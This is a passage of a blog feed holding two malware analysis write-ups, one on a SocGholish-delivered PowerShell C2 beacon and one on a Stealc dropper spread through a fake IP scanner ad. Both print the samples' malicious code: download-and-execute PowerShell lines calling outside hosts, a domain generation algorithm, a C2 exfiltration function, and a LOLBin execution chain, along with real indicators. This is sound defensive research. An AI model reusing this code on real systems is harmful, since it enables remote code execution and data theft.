</span><span style="color:#e6db74">		$rand_str += ($(&#39;</span>abcdefghijklmn<span style="color:#e6db74">&#39;) )[$rand_int.Next(0, 14)];
</span><span style="color:#e6db74">	}
</span><span style="color:#e6db74">	$global:block=(New-Object $(&#39;</span>System.Net.WebClient<span style="color:#e6db74">&#39;) ).($(&#39;</span>DownloadString<span style="color:#e6db74">&#39;) )($(&#39;</span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#e6db74">&#39;) +$rand_str+$(.top/523/sdfzw.php?i=) +$(hostname));
</span><span style="color:#e6db74">	rzs $global:block&#39;</span>
-WindowStyle hidden
</code></pre></div><p>As shown above, a request will be made to a DGA generated <code>.top</code> domain, all with the same hardcoded path of <code>/&lt;group_id&gt;/sdfzw.php</code>, and the victim hostname passed as a parameter in the format <code>?i=&lt;hostname&gt;</code>.</p>
<p>The response from the <code>.top</code> domain will be saved to a global variable, <code>$global:block</code>, and then executed. We will explore this in the next section.</p>
<h2 id="powershell-beacon---asyncrat">PowerShell Beacon - AsyncRAT</h2>
<p>Note: I noticed the PowerShell beacon has striking similarities to <a href="https://securitynews.sonicwall.com/xmlpost/github-available-asyncrat-going-fileless/">AsyncRAT</a>, and could be inspired by it.</p>
<p>The response from the <code>.top</code> domain was roughly 580KB of raw PowerShell, which, as we saw previously, is piped directly to IEX.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/sdfzw_php_response.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/sdfzw_php_response.png"
            alt="sdfzw_php_response"
            />
    </a>
    
</figure>
<p>I went to work formatting and attempting to deobfuscate.</p>
<p>Here is the original <a href="https://gist.github.com/rerednawyerg/ddc6c5c647e00c18a9c40536525b74c9">obfuscated payload</a>, and here is a <a href="https://gist.github.com/rerednawyerg/9632d828b05ee74eaa2928b37fe5d921">link</a> to the fully cleaned version to follow along with as you read.</p>
<p>The first 150 or so lines are simple aliases, and a few lines later, TypeAccelerators are used to create aliases for .NET framework classes.</p>
<p>A few .NET core classes are manually added, and then Invoke-Expression is called on a here-string, which is where the meat of the beacon lives.</p>
<h3 id="domain-generating-algorithm-dga">Domain Generating Algorithm (DGA)</h3>
<p>After executing the here-string, the first thing the beacon does is create a list of domains.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">static <span style="color:#66d9ef">[void]</span> create_c2s(){ 
	$temp_arr=@();
	$date = Get-Date;
	$week_of_year = <span style="color:#66d9ef">[int]</span>($date.((<span style="color:#e6db74">&#39;DayOfYear&#39;</span>)) / 7) + 1;
	$year = $date.((<span style="color:#e6db74">&#39;Year&#39;</span>));
	$seed_value = $week_of_year + $year * (429374);
	$random_obj = New-Object ((<span style="color:#e6db74">&#39;System.Random&#39;</span>))($seed_value);

	$fifteen = 15;
	$alphanumeric = (<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span>);

	<span style="color:#66d9ef">for</span> ($i = 0; $i <span style="color:#f92672">-lt</span> 10; $i++) { 
		$temp_str = <span style="color:#e6db74">&#34;&#34;</span>;

		<span style="color:#66d9ef">for</span> ($j = 0; $j <span style="color:#f92672">-lt</span> $fifteen; $j++) { 
			$rand_index=$random_obj.((<span style="color:#e6db74">&#39;next&#39;</span>))(0, $alphanumeric.Length);
			$temp_str += $alphanumeric[$rand_index];
		}
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.top&#39;</span>);
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.fun&#39;</span>);
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.com&#39;</span>);
		$temp_arr+=$temp_str + (<span style="color:#e6db74">&#39;.cn&#39;</span>);

	} 
	<span style="color:#66d9ef">[C2s_class]</span>::c2_array=$temp_arr 
}
</code></pre></div><p>Ten domains will be generated, each fifteen characters in length, and at first glance these domains will be completely random.</p>
<p>However, the <code>$week_of_year</code> variable will help control the output of the Random object which is created with the seed value, and is a common practice in DGAs.</p>
<p>To demonstrate, running the following will always produce the same series of digits in <code>$random_obj</code>, the first four of which are: 35, 23, 10, and 2.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Powershell" data-lang="Powershell">$date = Get-Date;
$day_of_year = 25;
$year = $date.((<span style="color:#e6db74">&#39;Year&#39;</span>));
$seed_value = $day_of_year + $year * (429374);
$random_obj = New-Object ((<span style="color:#e6db74">&#39;System.Random&#39;</span>))($seed_value);
$fifteen = 15;
$alphanumeric = (<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;</span>);
</code></pre></div><p>If we select the characters at the index of <code>$alphanumeric</code> which correspond with these digits, we get <code>9xkc..</code>.</p>
<p>Spoiler alert, the domain which responds to the C2 beacon during the 25th week of the year is <code>9xkcaayaagvr1p2[.]top</code>.</p>
<p>Hypothetically, this could be used to predict the C2 domains which will be used over the next weeks or months.</p>
<p>Of course, all the threat actor has to do is change the hardcoded digit used to generate the seed value and the output will be altered, so this information, while interesting, probably doesn&rsquo;t have much real-world value.</p>
<h3 id="mutex">Mutex</h3>
<p>Once the domains have been generated, the beacon checks whether a mutex named <code>rusgugh</code> exists, and if so, the beacon will terminate.</p>
<p>If the mutex does not exist, it will be created, and execution continues.</p>
<h3 id="connect-to-c2">Connect to C2</h3>
<p>With the domains created and the mutex check completed, the beacon now enters an infinite loop, calling a series of functions which will communicate with a C2 server.</p>
<p>The beacon will determine if any of the generated domains resolve to an IP address, and if so, will use a TCP socket to connect to it on port <code>14235</code>.</p>
<p>If the beacon connects to the C2 successfully, it will then gather data about the victim device and send it to the C2 via an SslStream object.</p>
<h3 id="device-enumeration">Device Enumeration</h3>
<p>The beacon will gather the following data about the device:</p>
<ul>
<li>AV Products</li>
<li>IP address (using api.ipify.org)</li>
<li>Device Name</li>
<li>User Name</li>
<li>OS Arch Type (64bit or 32bit)</li>
<li>Whether the user is in the built-in administrator role</li>
<li>Whether the device is domain joined</li>
</ul>
<p>This data is organized in a hashtable, converted to JSON, and then Gzip compressed. The compressed data is converted to a byte array and sent to the C2 via the SSL stream.</p>
<h3 id="c2-server-response">C2 Server Response</h3>
<p>Once the C2 responds, the beacon parses the response. If it determines there are commands to be executed, it passes the response to another function, which I&rsquo;ve named <code>perform_c2_command</code>.</p>
<p>The function will Gzip decompress the response, and convert it from JSON into a hashtable.</p>
<p>Then, the value of the <code>Packet</code> key in the hashtable is passed to a switch statement, and different actions are performed.</p>
<p>Valid switch statement values:</p>
<pre><code class="language-String" data-lang="String">&lt;random_string&gt; - sends a global count variable back to the C2.
plugin - stores an argument string for a DLL sent by the C2 into a global variable
iex - converts contents of the hashtable's `script` key from base64 and passes it to IEX
cmd - calls start-process using the values of the hashtable's `cmd` and `args` keys as parameters
selfdelete - performs &quot;remove-item $PWD\* -force -recurse exit&quot;
savePlugin - passes a base64 encoded .NET assembly to the &quot;run_dll&quot; function
</code></pre><p>All responses to the C2 commands are gzipped and sent back over the SSL stream.</p>
<p>The <code>run_dll</code> function mentioned in the <code>savePlugin</code> switch takes the base64 encoded byte array, reflectively loads it, and creates an instance of the specified type.</p>
<p>It then calls the <code>Run</code> method on the instance with the following arguments:</p>
<pre><code class="language-String" data-lang="String">$plugin_instance.(('Run'))(
[customclass1]::tcp_socket, 
[C2s_class]::ptr_raw_certificate, 
[C2s_class]::machine_name, 
[System.Convert]::(('FromBase64String'))([customclass1]::global_saved_parameter), 
[mutex_class]::mutex, 
$null, $null, $null  );
</code></pre><p>The beacon now continues on an infinite loop, waiting for commands from the C2 server.</p>
<h2 id="emulation">Emulation</h2>
<p>For fun, lets see if we can emulate a victim machine and coax some responses out of the C2 server.</p>
<p>I modified the script to log specific operations as well as requests and responses to and from the server.</p>
<p>Currently getting mixed results and haven&rsquo;t had enough time to explore it fully - I will dig into the responses in Part 4.</p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>Starting with a site infected with a SocGholish inject, I have traced it all the way to a dual payload of NetSupport RAT and an unknown PowerShell C2 beacon framework. As mentioned, this PowerShell C2 shares strong similarities to AynscRAT and DcRat, and likely took some inspiration from these projects.</p>
<p>I would like to give thanks and credit to <a href="https://infosec.exchange/@rmceoin">@rmceoin</a> for providing great feedback and tips while I was working through this post.</p>
<h2 id="execution-flow-chart">Execution Flow Chart</h2>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/SocGholish_Flow.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/SocGholish_Flow.png"
            alt="SocGholish_flow"
            />
    </a>
    
</figure>
<h2 id="iocs">IOCs</h2>
<p>SocGholish Stage 2:</p>
<ul>
<li>templates.jdlaytongrademaker[.]com</li>
</ul>
<p>SocGholish Stage 3:</p>
<ul>
<li>*.nodes.gammalambdalambda[.]org</li>
</ul>
<p>SocGholish Final Payload Dropper:</p>
<ul>
<li>wudugf[.]top/f23.svg</li>
</ul>
<p>NetSupport RAT:</p>
<ul>
<li>Gateway Address: weubhb[.]top:443</li>
<li>SecondaryGateway: ssdgsg4knmb[.]cn:443</li>
<li>serial_no=NSM165348</li>
<li>licensee=EVALUSION</li>
</ul>
<p>PowerShell Beacon Dropper:</p>
<ul>
<li>http://&lt;rand_str&gt;.top/523/sdfzw.php?i=&lt;hostname&gt;</li>
</ul>
<p>PowerShell C2 Beacon:</p>
<ul>
<li>r89kq6esetljq7r[.]top:14235</li>
<li>45.77.195.105</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Unraveling a Stealc Dropper</title>
            <link>https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/</link>
            <pubDate>Wed, 19 Apr 2023 10:15:56 -0500</pubDate>
            
            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/</guid>
            <description>As has been widely reported in the cybersecurity industry, Google searches resulting in malicious advertisements were incredibly prolific during late 2022 and early 2023. This activity has reduced significantly in recent months, but it isn&amp;rsquo;t quite dead yet.
On April 19th, a search for &amp;ldquo;IP Scanner&amp;rdquo; resulted in a suspicious advertisement listed above the legitimate Advanced IP Scanner site.</description>
            <content type="html"><![CDATA[<hr>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>As has been widely reported in the cybersecurity industry, Google searches resulting in malicious advertisements were incredibly prolific during late 2022 and early 2023. This activity has reduced significantly in recent months, but it isn&rsquo;t quite dead yet.</p>
<p>On April 19th, a search for &ldquo;IP Scanner&rdquo; resulted in a suspicious advertisement listed above the legitimate Advanced IP Scanner site.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/google_search.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/google_search.png"
            alt="screenshot_google_search"
            />
    </a>
    
</figure>
When the advertisment is clicked, the victim&rsquo;s IP address and device type are checked. If they meet the threat actor&rsquo;s specifications, a fake Advanced IP Scanner website is shown, otherwise, a dummy news outlet website is displayed.</p>
<p>This is common practice, and helps the threat actors hide their malicious activity from automated scans, takedowns, and security researchers.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/fake_ipscanner_site.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/fake_ipscanner_site.png"
            alt="fake_ipscanner_site"
            />
    </a>
    
</figure>
On clicking the download button, a file called &ldquo;Advanced_IP_Scanner_2.5.4594.1.exe&rdquo; is downloaded from Dropbox.</p>
<h2 id="initial-download-analysis">Initial Download: Analysis</h2>
<p>Opening the downloaded file in DetectItEasy, it is categorized as a Nullsoft Scriptable Install System (NSIS) package. This is good news, it means I can use 7zip to dump the contents of the installer and perform a closer inspection.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/unzipping.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/unzipping.png"
            alt="unzipping"
            />
    </a>
    
</figure></p>
<p>Several files are extracted, including the NSIS installation script (.nsi). Let&rsquo;s start there.</p>
<h3 id="nsisnsi">[NSIS].nsi</h3>
<p>For those who have not dug into NSIS scripts, here is a handy <a href="https://nsis.sourceforge.io/Docs/Chapter4.html">syntax guide</a>.</p>
<p>One of the first things I noticed were some typos in the <code>name</code> field - not necessarily important, but certainly indicates this is not a legitimate installer.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/typo.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/typo.png"
            alt="typos"
            />
    </a>
    
</figure></p>
<p>Scrolling down, I can see the installation directory is set to &ldquo;C:\ProgramData\Microsoft\NodejsToolsVsix&rdquo;.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/installdir.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/installdir.png"
            alt="installdir"
            />
    </a>
    
</figure></p>
<p>The file &ldquo;Advanced_IP_Scanner_2.5.4594.1.exe&rdquo; is written to the installation directory and executed. This file was contained within the original NSIS package and is the legitimate Advanced IP Scanner installation tool.</p>
<p>Now, things start to get more interesting. The script then checks whether a file named <code>Cert.txt</code> exists in the installation directory, and if so, it jumps to the end of the section, skipping the rest of the script.</p>
<p>If file did not previously exist, it is now created. This will stop the script from running multiple times.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section1.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section1.png"
            alt="section"
            />
    </a>
    
</figure>
Next, the script checks the registry to determine two things - if the device is part of a domain, and whether it is running Windows 10 or above. If either of these are false, the script will terminate.</p>
<p>Once the checks are complete, the script copies a 7z archive and a legitimate copy of the 7z tool to the installation directory.</p>
<p>The next command is executed via the built-in <a href="https://nsis.sourceforge.io/NsExec_plug-in">nsExec plugin</a>, a DLL whose function is to execute &ldquo;command-line based programs and capture the output without opening a dos box.&rdquo;</p>
<p>Using 7zip via the plugin, the script provides a hardcoded password to extract the contents of the archive and stores the output in the installation directory.<br>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/outputdir.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/outputdir.png"
            alt="outputdir"
            />
    </a>
    
</figure></p>
<p>After the archive is extracted, a new directory is created, and several files are copied from the installation directory to the new directory.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section2.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section2.png"
            alt="section2"
            />
    </a>
    
</figure></p>
<p>The script then creates two registry entries. The first is a <code>Run</code> key, which will cause the target <code>.lnk</code> file to execute whenever a user logs into to the device.</p>
<p><figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section3.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section3.png"
            alt="section3"
            />
    </a>
    
</figure>
Checking the properties of the <code>lnk</code> file, it contains the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\ProgramData\Microsoft\LogConverter\Microsoft.NodejsTools.PressAnyKey.exe abnormal c:\programdata\%username%0 cmd /c C:\ProgramData\Microsoft\LogConverter\LogConverter.bat
</code></pre></div><p>The <code>PressAnyKey.exe</code> file, which was previously extracted from the 7z archive, is a LOLBin first published on Twitter by <a href="https://twitter.com/mrd0x/status/1463526834918854661?s=20">mrd0x</a>.  It is a Microsoft signed binary which allows for the execution of other binaries, in this case, <code>cmd.exe</code>.</p>
<p>There are a few required parameters for the LOLBin to execute properly. The <code>abnormal</code> flag will cause the PressAnyKey process to exit once it creates the new <code>cmd.exe</code> process, and the <code>programdata</code> path is where the ProcessID will be written. I&rsquo;ll dig into the batch script passed to cmd.exe in the next section.</p>
<p>Back to the NSIS script, the second registry value created replaces the value in <code>HKLM\SOFTWARE\Microsoft\MSDTC\MTxOCI --&gt; OracleOciLibPath</code> with <code>C:\ProgramData\SysIco</code>. At this point, I am not sure what purpose this serves, but maybe I&rsquo;ll uncover it as I progress.</p>
<p>After the registry values are written, the previously copied files are deleted from the installation directory, and the script sleeps.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/section4.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/section4.png"
            alt="section4"
            />
    </a>
    
</figure></p>
<p>Finally, the script will use the <code>PressAnyKey</code> LOLBin to execute another batch script, and then exit.</p>
<h3 id="batch-scripts">Batch Scripts</h3>
<p>Following execution sequentially, I&rsquo;ve have now progressed to the first batch script. The content of the two <code>.bat</code> scripts are very similar, so I will only walk through one of them.<br>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/batch_script.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/batch_script.png"
            alt="batch_script"
            />
    </a>
    
</figure>
The script will create a PowerShell process and create two variables.</p>
<p>Line 9 is intentionally confusing, so let&rsquo;s break it down.</p>
<pre><code class="language-PS" data-lang="PS">SI Variable:DK (.$ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|GM)[6].Name).(($ExecutionContext.(($ExecutionContext|GM)[6].Name)|GM|Where{(GV _ -ValueO).Name-clike'*Com*e'}).Name).Invoke('*w-*ct',1,1),[Management.Automation.CommandTypes]::Cmdlet)(LS Variable:P).Value);
</code></pre><p>Taking each part piece by piece starting with <code>($ExecutionContext|GM)[6].Name</code>, I drop this into a new PowerShell session and see it is equivalent to <code>InvokeCommand</code>. Performing this translation and substitution throughout, the script can be simplified.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/batch_cleaned.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/batch_cleaned.png"
            alt="batch_cleaned"
            />
    </a>
    
</figure>
Line 11 uses method overloading to perform Invoke-Expression while trying to avoid any strings that may flag AMSI or AV.</p>
<p>Really, the script could be boiled down to just:</p>
<pre><code class="language-PS" data-lang="PS">Invoke-Expression(New-Object Net.WebClient).DownloadString.Invoke(C:\ProgramData\Microsoft\LogConverter\CG6oDkyFHl3R.t)
</code></pre><p>Note: Apparently if using this overload technique, PowerShell will attempt to execute whatever file is passed to Invoke() as if it were PowerShell, no matter the file extension. I am not a PS expert, so not sure why that is.</p>
<p>Execution now passes on the to the <code>.t</code> file, which contains more PowerShell.</p>
<h3 id="t-file">.T File</h3>
<p>As with the previous batch scripts, the two <code>.t</code> files from this sample are very similar to each other, with a few differences I&rsquo;ll discuss momentarily.</p>
<p>It starts out by defining a byte key and a very long encrypted standard string.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/t_file.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/t_file.png"
            alt="t_file"
            />
    </a>
    
</figure>
In line 4, the encrypted string is converted to a <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-7.0">secure string</a> using the key variable. The secure string is then copied to an unmanaged binary string, which is then copied to a managed string.</p>
<p>Once the string is copied into managed memory, it can be echoed out to view the contents - looking at lines 8 and 9, I know it will be C# source code.</p>
<p>Line 8 defines a .NET class in the PowerShell session using the contents of the <code>$managed_str</code>, while line 9 calls a specific method from the class, passing in some arguments.</p>
<p>I previously mentioned some differences between the two <code>.t</code> files - the encrypted standard string, the key, and the arguments are the only variations, the rest of the functionality is the same.</p>
<p>Now execution moves to stage two, and since I&rsquo;ve got the C# source code, I can load it into Visual Studio and analyze it further.</p>
<h2 id="net-loader--beacon">.NET Loader / Beacon</h2>
<p>The source code originally had all the class, method, and variable names set to random strings, so I first went through each method and renamed everything appropriately.</p>
<p>I also made some small changes so I could compile the code and create a binary which I could step through in a debugger. You can view my cleaned version of the source code <a href="https://pastebin.com/gBFa7MPc">here</a>.</p>
<p>Since the source code is de-obfuscated and simple, I&rsquo;ll just do a brief analysis of it.</p>
<h3 id="loader-functionality">Loader Functionality</h3>
<p>As noted earlier, the method called by the <code>.t</code> file is:<br>
<code>rYqzrd(&quot;https://snow.cdn-b1d8e9.workers.dev&quot;, &quot;OYEXidNnoFTXfoKbDqoEaOuj&quot;, &quot;75000&quot;)</code></p>
<p>A custom string generator method is used, which creates a random 16 character alphanumeric string. This will be used as a &ldquo;registration id&rdquo; for the C2 server.</p>
<p>The second argument is converted to a byte array &ndash; spoiler alert, this is an RC4 key which will be used to encrypt/decrypt the communications with the C2.</p>
<p>Argument three is used to pass to the <code>Sleep</code> method, controlling the rate of the C2 beacon.</p>
<p>To &ldquo;register&rdquo; the victim device, the script creates a formatted string using the registration id and the result of another custom method, which returns the ComputerName, UserDomain, and UserName environment variable values.</p>
<p>The registration string is then sent to the C2 server using a method I&rsquo;ve renamed to &ldquo;c2_comms&rdquo;.</p>
<p>Once the victim has been registered, the script enters a loop. In each iteration, it will sleep for 75 seconds before contacting the C2 again.<br>
If the C2 does not respond, the loop continues without taking any action.</p>
<p>If the C2 answers, the response will be decrypted using the hardcoded RC4 key, and depending on the content of the response one of four actions will be taken.</p>
<ul>
<li>Alter the beacon time</li>
<li>Take a screenshot and send it to the C2</li>
<li>Exit the loop</li>
<li>Execute the command from the C2 and send back the response</li>
</ul>
<p>Let&rsquo;s take a look at how the script communicates with the C2 server.</p>
<h3 id="loader-c2-communication">Loader C2 Communication</h3>
<p>If a string is passed in as the first argument to the <code>c2_comms</code> method, it will first be encrypted using RC4. The key, as mentioned earlier, is <code>OYEXidNnoFTXfoKbDqoEaOuj</code>.</p>
<p>A URI is then generated with a random string as the path, and used to create a web request. The OS version is set as the UserAgent, and a hardcoded host string is used as the host field.</p>
<p>Note: I believe this means the domain argument originally passed into the loader is irrelevant; since the host parameter is hardcoded, it will always override the argument string.
In fact, the arguments used in the other <code>.t</code> file are: <code>(&quot;https://mscrl.microsoft.com&quot;, &quot;fLYQnVRnUoiGOuJdSXkNkDfC&quot;, &quot;20000&quot;)</code>. The use of the benign Microsoft domain indicates an attempt to disguise the real destination.</p>
<p>It is possible the threat actor meant to use a benign URL in both arguments, but forgot to replace one of them.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> c2_comms(<span style="color:#66d9ef">string</span> arg1, <span style="color:#66d9ef">string</span> arg2)
{
	<span style="color:#66d9ef">byte</span>[] rc4_encrypted_string;
	<span style="color:#66d9ef">if</span> (arg1 != <span style="color:#66d9ef">null</span>)
	{
		rc4_encrypted_string = rc4_class.call_rc4_encrypt(byte_array, Encoding.ASCII.GetBytes(arg1));
	}
	<span style="color:#66d9ef">else</span>
	{
		rc4_encrypted_string = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">0</span>];
	}
	<span style="color:#75715e">//will generate a url string with a random string as the path
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">string</span> url_string = String.Format(<span style="color:#e6db74">&#34;{0}/{1}/&#34;</span>, snow_cdn_url, rand_str_generator(<span style="color:#ae81ff">0</span>));
	HttpWebRequest http_request = (HttpWebRequest)WebRequest.Create(url_string);
	http_request.Method = <span style="color:#e6db74">&#34;POST&#34;</span>;
	http_request.UserAgent = os_version_str;
	http_request.Timeout = <span style="color:#ae81ff">10000</span>;
	http_request.Host = <span style="color:#e6db74">&#34;snow.cdn-b1d8e9.workers.dev&#34;</span>;
	http_request.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
	Stream stream = <span style="color:#66d9ef">null</span>;
	StreamReader streamreader = <span style="color:#66d9ef">null</span>;
	<span style="color:#66d9ef">string</span> streamreader_content;
	<span style="color:#66d9ef">string</span> data_str = <span style="color:#e6db74">&#34;&#34;</span>;
	<span style="color:#66d9ef">if</span> (rc4_encrypted_string.Length &gt; <span style="color:#ae81ff">0</span>)
	{
		data_str = Convert.ToBase64String(rc4_encrypted_string);
	}
	HnvKzYXNyYAYLD data_to_send = <span style="color:#66d9ef">new</span> HnvKzYXNyYAYLD
	{
		UUID = arg2,
		ID = rand_str,
		Data = data_str
	};
	<span style="color:#66d9ef">var</span> js_serializer = <span style="color:#66d9ef">new</span> JavaScriptSerializer();
	<span style="color:#66d9ef">var</span> serialized_data = js_serializer.Serialize(data_to_send).ToString();
	http_request.ContentType = <span style="color:#e6db74">&#34;application/json&#34;</span>;
	<span style="color:#66d9ef">try</span>
	{
		stream = http_request.GetRequestStream();
		stream.Write(Encoding.ASCII.GetBytes(serialized_data), <span style="color:#ae81ff">0</span>, serialized_data.Length);
	}
	<span style="color:#66d9ef">finally</span>
	{
		<span style="color:#66d9ef">if</span> (stream != <span style="color:#66d9ef">null</span>)
		{
			stream.Dispose();
		}
	}
	<span style="color:#66d9ef">try</span>
	{
		stream = http_request.GetResponse().GetResponseStream();
		streamreader = <span style="color:#66d9ef">new</span> StreamReader(stream);
		streamreader_content = streamreader.ReadToEnd();
	}
	<span style="color:#66d9ef">catch</span>
	{
		streamreader_content = <span style="color:#e6db74">&#34;&#34;</span>;
	}
	<span style="color:#66d9ef">return</span> streamreader_content.ToString();
}
</code></pre></div><p>The encrypted string is then base64 encoded, added as an element to a structure, serialized, and sent to the C2 server. If there is a response, it is returned from the method.</p>
<p>There are a few more methods contained within this loader, but out of scope of the write up. I&rsquo;ll now move on to emulating the communications between a victim and the C2.</p>
<h2 id="communication-emulation">Communication Emulation</h2>
<p>My next goal is to use the loader to communicate with the C2 server while logging all requests and responses. Since I have the source code, I&rsquo;ve got a few options to chose from.</p>
<p>I could add some C# code to log the plaintext requests and responses as the loader runs. However, I want to showcase a cool feature I learned recently in dnSpy, so I chose to simply add a main method and compile the binary as is.</p>
<h3 id="dnspy-tracepoints">dnSpy Tracepoints</h3>
<p>Once the binary was loaded into dnSpy, I set breakpoints right before data was sent to the C2 and right after the response was decoded.</p>
<p>As I learned in a great video from <a href="https://www.youtube.com/watch?v=yxw4h82mQ2s">DuMp-GuY TrIcKsTeR</a>, breakpoints can be converted into &ldquo;tracepoints&rdquo;, which can evaluate conditional expressions, perform filtering, and log messages either to the console or to the file system.</p>
<p>Here is an example of the formatting of a tracepoint log message:</p>
<pre><code class="language-string" data-lang="string">$FUNCTION Response_String: {response_struct.Data} {System.IO.File.AppendAllText(&quot;C:\\Users\\&lt;user&gt;\\log.txt&quot;,&quot;ResponseID\n&quot;+response_struct.ID + &quot;\nResp_UUID\n&quot;+response_struct.UUID+&quot;\nresp_data\n&quot;+response_struct.Data+&quot;\n&quot;)}
</code></pre><p>With the tracepoints in place, I can now execute the loader, sit back, and hope the server is still live.</p>
<h3 id="server-response">Server Response</h3>
<p>The first call to the C2 contained the following content:</p>
<pre><code class="language-String" data-lang="String">ID --&gt; uVX1bTFdMmzgD2nW
UUID --&gt; NULL
data --&gt; &lt;b64_rc4enc_string&gt; --&gt; (decoded &amp; decrypted: &quot;register uVX1bTFdMmzgD2nW DESKTOP-JRFM9FE DESKTOP-JRFM9FE\&lt;user&gt;&quot;)
</code></pre><p>The server responded immediately with:</p>
